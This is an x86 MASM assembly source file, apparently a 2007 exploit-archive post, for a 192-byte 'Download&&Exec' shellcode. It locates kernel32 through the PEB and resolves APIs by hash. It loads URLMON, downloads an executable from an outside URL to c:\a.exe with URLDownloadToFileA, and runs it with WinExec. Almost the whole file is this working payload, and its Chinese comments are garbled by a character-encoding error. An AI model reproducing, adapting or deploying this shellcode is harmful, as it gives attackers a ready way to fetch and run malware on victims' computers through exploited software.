;Tiny Download&&Exec ShellCode codz czy 2007.6.1
;header 163=61(16+8+9+(28))+95(68+27)+17
;163+19=192
comment %
                #--------------------------------------#          #
              #  Tiny Download&&Exec ShellCode-->       #       #
            #    -->size 192                              #   #
          #                      2007.06.01                 #  
            #                    codz: czy                #   #
            #                  www.ph4nt0m.org           #     #
             #------------------------------------------#       #

system :test on ie6+XPSP2/2003SP2/2kSP4
%
.586
.model flat,stdcall
option casemap:none

include     c:\masm32\include\windows.inc
include     c:\masm32\include\kernel32.inc
includelib  c:\masm32\lib\kernel32.lib
include     c:\masm32\include\user32.inc
includelib  c:\masm32\lib\user32.lib


.data
shelldatabuffer db 1024 dup(0)
shellcodebuffer	db 2046 dup(0)
downshell	db 'down exploit',0
.code
start:
	invoke	MessageBoxA,0,offset downshell,offset downshell,1
	invoke	RtlMoveMemory,offset shellcodebuffer,00401040H,256
	mov	eax,offset shellcodebuffer
	jmp	eax
	somenops db 90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h,90h
;ÃÃÃÃ¦ÂµÃÂ´ÃºÃÃ«ÃÃÂ°ÃÃÃÂ´ÃºÃÃ«Â¶ÃÃÃÂµÃshellcodeÃÃÂ¶Â¯ÃÃ½Â¾ÃÂ¶ÃÃÃÃÂ´ÃÃÂ£Â¬ÃÂ£ÃÃ¢ÃÃ¦ÃÂµÂµÃshellcodeÃÂ´ÃÃÂ»Â·Â¾Â³	
@@shellcodebegin:		
	call	@@beginaddr
@@beginaddr:
	PUSH 03H      ;ÃÂªÂµÃ·ÃÃÂµÃAPIÂºÂ¯ÃÃ½Â¸Ã¶ÃÃ½
	jmp	@@realshellcode          
myExitProcess     dd 073e2d87eh   
myWinExec         dd 00e8afe98h    
myLoadLibraryA    dd 0ec0e4e8eh
dll               db 'URLMON',0,0
myUrlDownFile     dd 0702f1a36h
path              db 'c:\a.exe',0
url               db 'http://www.ph4nt0m.org/a.exe',0



@@realshellcode:
    POP ECX
    POP EDI
    SCASD ;edi+4
;ÂµÃÂµÂ½kernel32.dllÂ»Ã¹ÂµÃÃÂ·
db  67h,64h,0A1h,30h,00h
	mov eax, [eax+0cH]
	mov esi, [eax+1cH]
    lodsd 
	mov ebp, [eax+08H]          ;EBPÃÃÂ´Ã¦Â·Ãkernel32.dllÂµÃÂ»Ã¹ÂµÃÃÂ·
;Â´Â¦ÃÃ­ÂµÂ¼Â³Ã¶Â±Ã­
@@next2:
PUSH      ECX
@@next3:
MOV       ESI,[EBP+3Ch]
MOV       ESI,[EBP+ESI+78h]
ADD       ESI,EBP
PUSH      ESI
MOV       ESI,[ESI+20h]
ADD       ESI,EBP
XOR       ECX,ECX
DEC       ECX
@@next:
INC       ECX
LODSD
ADD       EAX,EBP
XOR       EBX,EBX
@@again:
    MOVSX     EDX,BYTE PTR [EAX]
    CMP       DL,DH
    JZ        @@end
    ROR       EBX,0Dh
    ADD       EBX,EDX
    INC       EAX
    JMP       @@again
@@end:
CMP       EBX,[EDI]
JNZ       @@next

POP       ESI
MOV       EBX,[ESI+24h]
ADD       EBX,EBP
MOV       CX,WORD PTR [ECX*2+EBX]
MOV       EBX,[ESI+1Ch]
ADD       EBX,EBP
MOV       EAX,[ECX*4+EBX]
ADD       EAX,EBP
STOSD
POP       ECX
loop @@next2

mov ecx,[edi]   ;2
cmp cl,'c'      ;3
jz @@downfile   ;2
PUSH EDI
CALL EAX        ;2
xchg eax,ebp
scasd
scasd
push 01         ;2ÂµÃÂ¶Ã¾Â¸Ã¶DLLÂµÃÂºÂ¯ÃÃ½Â¸Ã¶ÃÃ½
jmp @@next3     ;2
                ;ÃÃÂ¼Ã17

         
@@downfile:

	push	edx  ;0
	push	edx  ;0
	push    edi  ;file=c:\a.exe
	lea     ecx, dword ptr [edi+9h]
	push    ecx  ;url
	push	edx  ;0
	call	eax  ;URLDownloadToFileA,0,url,file=c:\a.exe,0,0
	
	
	push 1 ;FOR TEST
	push edi
	call dword ptr [edi-14H] ;winexec,'c:\xxx.exe',1
	
    call dword ptr [edi-18H] ;Exitprocess

    somenops2 db 90h,90h,90h,90h,90h,90h,90h,90h,90h
    invoke ExitProcess,0
end start

; milw0rm.com [2007-06-27]